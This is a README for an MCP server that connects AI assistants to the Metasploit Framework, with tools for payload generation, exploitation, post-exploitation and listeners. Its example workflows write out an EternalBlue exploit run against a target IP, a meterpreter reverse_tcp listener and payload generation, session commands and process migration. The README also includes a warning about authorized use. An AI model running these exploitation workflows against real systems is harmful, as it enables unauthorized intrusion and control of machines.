# Metasploit MCP Server

A Model Context Protocol (MCP) server for Metasploit Framework integration.

## Description

This MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.

## Features

### Payload Generation and Execution

- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)
- **execute_local_program**: Execute a locally saved program (e.g., generated payloads)

### Exploitation Workflow

- **list_exploits**: Search and list available Metasploit exploit modules
- **list_payloads**: Search and list available Metasploit payload modules
- **run_exploit**: Configure and execute an exploit against a target
- **list_active_sessions**: Show current Metasploit sessions
- **send_session_command**: Run a command in an active session

### Post-Exploitation Tools

- **get_system_info**: Retrieve system information from a Meterpreter session
- **get_user_id**: Get the current user context of a session
- **list_processes**: List running processes on the target system
- **migrate_process**: Move a Meterpreter session to another process
- **filesystem_list**: List files in a directory on the target system

### Listener Management

- **list_listeners**: Show all active handlers and background jobs
- **start_listener**: Create a new multi/handler to receive connections
- **stop_job**: Terminate any running job or handler

### Auxiliary Module Support

- **run_auxiliary_module**: Run any Metasploit auxiliary module with options

## Prerequisites

- Metasploit Framework installed and msfrpcd running
- Python 3.10 or higher
- Required Python packages (see requirements.txt)

## Installation

1. Clone this repository
2. Install dependencies:
   ```
   pip install -r requirements.txt
   ```
3. Configure environment variables (optional):
   ```
   MSF_PASSWORD=yourpassword
   MSF_SERVER=127.0.0.1
   MSF_PORT=55553
   MSF_SSL=false
   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads
   ```

## Usage

Start the Metasploit RPC service:

```bash
msfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553
```

For Claude Desktop integration, configure `claude_desktop_config.json`:

```json
{
    "mcpServers": {
        "metasploit": {
            "command": "uv",
            "args": [
                "--directory",
                "C:\\path\\to\\MetasploitMCP",
                "run",
                "MetasploitMCP.py"
            ],
            "env": {
                "MSF_PASSWORD": "yourpassword"
            }
        }
    }
}
```

## Security Considerations

⚠️ **IMPORTANT SECURITY WARNING**:

This tool provides direct access to Metasploit Framework capabilities, which include powerful exploitation features. Use responsibly and only in environments where you have explicit permission to perform security testing.

- Always validate and review all commands before execution
- Only run in segregated test environments or with proper authorization
- Be aware that post-exploitation commands can result in significant system modifications

## Example Workflows

### Basic Exploitation

1. List available exploits: `list_exploits("ms17_010")`
2. Select and run an exploit: `run_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.100", 445)`
3. List sessions: `list_active_sessions()`
4. Run commands: `send_session_command(1, "getuid")`

### Post-Exploitation

1. Get system information: `get_system_info(1)`
2. List running processes: `list_processes(1)`
3. Migrate to a more stable process: `migrate_process(1, 1234)`
4. Browse the filesystem: `filesystem_list(1, "C:\\Users")`

### Handler Management

1. Start a listener: `start_listener("windows/meterpreter/reverse_tcp", "192.168.1.10", 4444)`
2. List active handlers: `list_listeners()`
3. Generate a payload: `generate_payload("windows/meterpreter/reverse_tcp", "exe", {"LHOST": "192.168.1.10", "LPORT": 4444})`
4. Stop a handler: `stop_job(1)`

## Configuration Options

### Payload Save Directory

By default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\Users\YourUsername\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.

**Setting the environment variable:**

- **Windows (PowerShell)**:
  ```powershell
  $env:PAYLOAD_SAVE_DIR = "C:\custom\path\to\payloads"
  ```

- **Windows (Command Prompt)**:
  ```cmd
  set PAYLOAD_SAVE_DIR=C:\custom\path\to\payloads
  ```

- **Linux/macOS**:
  ```bash
  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads
  ```

- **In Claude Desktop config**:
  ```json
  "env": {
      "MSF_PASSWORD": "yourpassword",
      "PAYLOAD_SAVE_DIR": "C:\\your\\actual\\path\\to\\payloads"  // Only add if you want to override the default
  }
  ```

**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.

## License

Apache 2.0
